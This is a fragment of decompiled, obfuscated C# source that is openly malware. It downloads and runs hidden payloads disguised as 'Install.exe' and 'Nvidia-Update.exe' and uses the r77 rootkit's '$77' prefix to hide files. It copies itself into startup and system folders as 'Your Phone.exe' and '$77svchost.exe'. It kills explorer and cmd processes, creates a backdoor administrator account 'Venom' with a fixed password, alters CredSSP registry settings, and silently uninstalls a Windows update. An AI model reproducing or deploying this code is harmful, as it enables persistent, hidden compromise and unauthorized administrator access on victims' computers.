    string str = Path.Combine(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), name);
    new WebClient().DownloadFile(link, str);
    \uF5C7\u2748卅굝쓠灕칸뤅\uFFFDᤇ\u2BEF㙾\u2FB2繅\u2D9A뭚䭉㽩寈雭.\u0337䒿云\u270D渖ၾ\u245C嫵씛딼\uE4D3琧\uEDDE嚂긻\uE62E\uAAD3㴠\u1BFFϪ(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void \u2BD0앫\uF554됛\uFFC0\uECA0\u27B0狗\uE7EA秎끡옡\u086Cᐌꏀ\uF7EC䤢틕\uE710ᦳ(
    string link,
    string name)
  {
    string str = Path.Combine(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), name);
    new WebClient().DownloadFile(link, str);
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
  }

  public static void \uE705樶삩\uE3D3칀슠枫\uEA31䅣殁\uE93D撹섞ﱟ\uA7C8蒁ど潐㨎쾂()
  {
    foreach (string file in Directory.GetFiles(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "*.txt"))
      System.IO.File.Delete(file);
  }

  public static void \uE29E骈\u285E堐䅌ႃ\uE5B7侗灵椣뫷옚瀊\uE172㢫\uF41F貟\u00B2뫡\uFB42()
  {
    try
    {
      bool[] flagArray = new bool[2]{ true, false };
      foreach (bool flag in flagArray)
      {
        using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, flag ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
        {
          if ((registryKey.GetValue("AppInit_DLLs", (object) "") as string).Contains("$77-"))
            registryKey.SetValue("AppInit_DLLs", (object) "");
        }
      }
    }
    catch (Exception ex)
    {
    }
  }

  public static void Ϧ̃ꖖ資᪱ഃ翀픻崒\uF0C7磜댏ผẔ铞鰑만䘲੧뀣()
  {
    string str = Path.Combine(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "Install.exe");
    System.IO.File.WriteAllBytes(str, 얀橇ꂬ쒻쨏㹚ử奂\u2A5E䭃\u2F4E튎䭑爐潁\uF801\u2EFF킁㿰\uE6CE.Install);
    Process.Start(str);
    \uF5C7\u2748卅굝쓠灕칸뤅\uFFFDᤇ\u2BEF㙾\u2FB2繅\u2D9A뭚䭉㽩寈雭.\u0337䒿云\u270D渖ၾ\u245C嫵씛딼\uE4D3琧\uEDDE嚂긻\uE62E\uAAD3㴠\u1BFFϪ(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ແ笗\uFFFD\uF71D渫弚ꂗ쁑\u2785囼推㝈䬃ਊ\u082F鶌\uF612ᙿ鴳띗();
  }

  public static void ﭨ樓ᰥ梉\uF66C먢\uEE6A맑퍈퇂ớ둈萺礤变ሏ婝ꎑᓌ囼()
  {
    Process.Start("cmd.exe", "/c taskkill /f /im explorer.exe");
    Thread.Sleep(500);
    Process.Start(Environment.SystemDirectory + "\\..\\explorer.exe");
  }

  public static void \u1A8C爕췣弛ⴕ\uFFFD䎊뜀鉗\uF790\uE842ﰮŶ\u2319瀺と㚼俅\u32ABӗ()
  {
    string str = Path.Combine(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "Nvidia-Update.exe");
    System.IO.File.WriteAllBytes(str, 얀橇ꂬ쒻쨏㹚ử奂\u2A5E䭃\u2F4E튎䭑爐潁\uF801\u2EFF킁㿰\uE6CE.Chrome);
    Process.Start(str);
    \uF5C7\u2748卅굝쓠灕칸뤅\uFFFDᤇ\u2BEF㙾\u2FB2繅\u2D9A뭚䭉㽩寈雭.\u0337䒿云\u270D渖ၾ\u245C嫵씛딼\uE4D3琧\uEDDE嚂긻\uE62E\uAAD3㴠\u1BFFϪ(new string[1]
    {
      str
    });
    System.IO.File.SetAttributes(str, FileAttributes.Hidden);
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ແ笗\uFFFD\uF71D渫弚ꂗ쁑\u2785囼推㝈䬃ਊ\u082F鶌\uF612ᙿ鴳띗();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.ﭨ樓ᰥ梉\uF66C먢\uEE6A맑퍈퇂ớ둈萺礤变ሏ婝ꎑᓌ囼();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.퓔\u2718㑘尨Ὓ돣衺㢋蒗\uE249懨렅\uEC2C隰옷벳\u20AA暓愶\uFFFD();
    ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.巐뛏뱪洇歔艎ᶝ뭩鏛\u25BCꔲ牧ꩉ鷧Ⲅ禆ȼᆽꧧ蹮();
  }

  public static void 尵튞\uFFFD䣱ꌦ矪브\u269E鏯\uFFFD쌡ꖞ氫㖫䲧꺵\uE496\u255C\uEA0F踪() => Array.ForEach<Process>(Process.GetProcessesByName("cmd"), (Action<Process>) (x => x.Kill()));

  public static void ແ笗\uFFFD\uF71D渫弚ꂗ쁑\u2785囼推㝈䬃ਊ\u082F鶌\uF612ᙿ鴳띗() => ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.尵튞\uFFFD䣱ꌦ矪브\u269E鏯\uFFFD쌡ꖞ氫㖫䲧꺵\uE496\u255C\uEA0F踪();

  public static void 퓔\u2718㑘尨Ὓ돣衺㢋蒗\uE249懨렅\uEC2C隰옷벳\u20AA暓愶\uFFFD()
  {
    Thread.Sleep(30000);
    foreach (string file in Directory.GetFiles(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "*.dll"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "Install.exe"))
      System.IO.File.Delete(file);
    foreach (string file in Directory.GetFiles(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "Nvidia-Update.exe"))
      System.IO.File.Delete(file);
  }

  public static void 巐뛏뱪洇歔艎ᶝ뭩鏛\u25BCꔲ牧ꩉ鷧Ⲅ禆ȼᆽꧧ蹮()
  {
    if (!System.IO.File.Exists(Path.Combine(Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD), "Install.exe")))
      return;
    string str1 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string[] files1 = Directory.GetFiles(str1, "r77-x64.dll");
    string destFileName1 = Path.Combine(str1, "$77-x64.dll");
    foreach (string sourceFileName in files1)
      System.IO.File.Move(sourceFileName, destFileName1);
    string str2 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string[] files2 = Directory.GetFiles(str2, "r77-x64.dll");
    string destFileName2 = Path.Combine(str2, "$77-x86.dll");
    foreach (string sourceFileName in files2)
      System.IO.File.Move(sourceFileName, destFileName2);
    string str3 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string[] files3 = Directory.GetFiles(str3, "Install.exe");
    string destFileName3 = Path.Combine(str3, "$77-Install.exe");
    foreach (string sourceFileName in files3)
      System.IO.File.Move(sourceFileName, destFileName3);
    string str4 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    string[] files4 = Directory.GetFiles(str4, "Nvidia-Update.exe");
    string destFileName4 = Path.Combine(str4, "$77-Nvidia-Update.exe");
    foreach (string sourceFileName in files4)
      System.IO.File.Move(sourceFileName, destFileName4);
  }

  public static void 邾엃㔊瘴噔դڂ勪엙먡ਣ\u230C泍鞱\u2A6Bᅩ\uEAB2\u27F4ޝ䊢()
  {
    string destFileName1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup), "Your Phone.exe");
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName1);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName1
    });
    string destFileName2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Your Phone.exe");
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName2);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName2
    });
    string destFileName3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Personal), "$77Your Phone.exe");
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName3);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName3
    });
    string destFileName4 = "C:\\users\\public\\$77sys.exe";
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName4);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName4
    });
    string destFileName5 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "$77svchost.exe");
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName5);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName5
    });
    string destFileName6 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "$77svchost.exe");
    System.IO.File.Copy(보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.InstallPath, destFileName6);
    Process.Start(new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      CreateNoWindow = true,
      UseShellExecute = false,
      FileName = destFileName6
    });
  }

  public static void \uFD4A\u276E\uFFFDﭹ貂단腵ퟧ\uFE18䂦Ḋ櫷赣브刃\uFFFD㟶鈞\u303Dϋ()
  {
    switch (Environment.OSVersion.Version.Major)
    {
      case 5:
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey1 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey1 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey1.SetValue("dontdisplaylastusername", (object) 1);
        registryKey1.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey1.SetValue("DWORD", (object) 2);
        registryKey1.Flush();
        string identityValue1 = "Venom";
        string newPassword1 = "Venom";
        PrincipalContext context1;
        try
        {
          Console.WriteLine("Building System Information");
          context1 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context1, identityValue1) != null)
        {
          Console.WriteLine(identityValue1 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user1 = new UserPrincipal(context1);
        user1.Name = identityValue1;
        user1.DisplayName = "Venom Administrative User";
        user1.PasswordNeverExpires = true;
        user1.SetPassword(newPassword1);
        user1.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user1.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal1 = (GroupPrincipal) null;
        try
        {
          groupPrincipal1 = GroupPrincipal.FindByIdentity(context1, "Administrators");
          if (groupPrincipal1 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal1.Members.Contains(context1, IdentityType.SamAccountName, identityValue1))
            {
              Console.WriteLine("Administrators already contains " + identityValue1);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal1.Members.Add(user1);
            groupPrincipal1.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal1.Dispose();
        user1.Dispose();
        context1.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 6:
        RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey2 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey2.SetValue("dontdisplaylastusername", (object) 1);
        registryKey2.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey2.SetValue("DWORD", (object) 2);
        registryKey2.Flush();
        string identityValue2 = "Venom";
        string newPassword2 = "Venom";
        PrincipalContext context2;
        try
        {
          Console.WriteLine("Building System Information");
          context2 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context2, identityValue2) != null)
        {
          Console.WriteLine(identityValue2 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user2 = new UserPrincipal(context2);
        user2.Name = identityValue2;
        user2.DisplayName = "Venom Administrative User";
        user2.PasswordNeverExpires = true;
        user2.SetPassword(newPassword2);
        user2.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user2.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal2 = (GroupPrincipal) null;
        try
        {
          groupPrincipal2 = GroupPrincipal.FindByIdentity(context2, "Administrators");
          if (groupPrincipal2 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal2.Members.Contains(context2, IdentityType.SamAccountName, identityValue2))
            {
              Console.WriteLine("Administrators already contains " + identityValue2);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal2.Members.Add(user2);
            groupPrincipal2.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal2.Dispose();
        user2.Dispose();
        context2.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
      case 10:
        Process.Start(new ProcessStartInfo()
        {
          FileName = "cmd",
          Arguments = "/k start /b wusa /uninstall /kb:4471332 /quiet & exit",
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          ErrorDialog = false
        });
        RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (registryKey3 == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", RegistryKeyPermissionCheck.ReadWriteSubTree);
          registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        }
        else
          registryKey3.SetValue("dontdisplaylastusername", (object) 1);
        registryKey3.Flush();
        if (Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true) == null)
        {
          Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", RegistryKeyPermissionCheck.ReadWriteSubTree);
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters", true).SetValue("DWORD", (object) 2);
        }
        else
          registryKey3.SetValue("DWORD", (object) 2);
        registryKey3.Flush();
        string identityValue3 = "Venom";
        string newPassword3 = "Venom";
        PrincipalContext context3;
        try
        {
          Console.WriteLine("Building System Information");
          context3 = new PrincipalContext(ContextType.Machine, (string) null);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create System Context.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Checking if User Exists.");
        if (UserPrincipal.FindByIdentity(context3, identityValue3) != null)
        {
          Console.WriteLine(identityValue3 + " already exists. Exiting!!");
          Console.ReadLine();
          break;
        }
        Console.WriteLine("Building User Information");
        UserPrincipal user3 = new UserPrincipal(context3);
        user3.Name = identityValue3;
        user3.DisplayName = "Venom Administrative User";
        user3.PasswordNeverExpires = true;
        user3.SetPassword(newPassword3);
        user3.Enabled = new bool?(true);
        try
        {
          Console.WriteLine("Creating New User");
          user3.Save();
        }
        catch (Exception ex)
        {
          Console.WriteLine("Failed to create user.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
          break;
        }
        GroupPrincipal groupPrincipal3 = (GroupPrincipal) null;
        try
        {
          groupPrincipal3 = GroupPrincipal.FindByIdentity(context3, "Administrators");
          if (groupPrincipal3 != null)
          {
            Console.WriteLine("Checking if itadmin is part of Administrators Group");
            if (groupPrincipal3.Members.Contains(context3, IdentityType.SamAccountName, identityValue3))
            {
              Console.WriteLine("Administrators already contains " + identityValue3);
              break;
            }
            Console.WriteLine("Adding itadmin to Administrators Group");
            groupPrincipal3.Members.Add(user3);
            groupPrincipal3.Save();
            break;
          }
          Console.WriteLine("Could not find the group Administrators");
        }
        catch (Exception ex)
        {
          Console.WriteLine("Exception adding user to group.");
          Console.WriteLine("Exception: " + ex?.ToString());
          Console.WriteLine();
          Console.WriteLine("Press Any Key to Continue");
          Console.ReadLine();
        }
        Console.WriteLine("Cleaning Up");
        groupPrincipal3.Dispose();
        user3.Dispose();
        context3.Dispose();
        Console.WriteLine();
        Console.WriteLine("Press Any Key to Continue");
        Console.ReadLine();
        break;
    }
  }
}
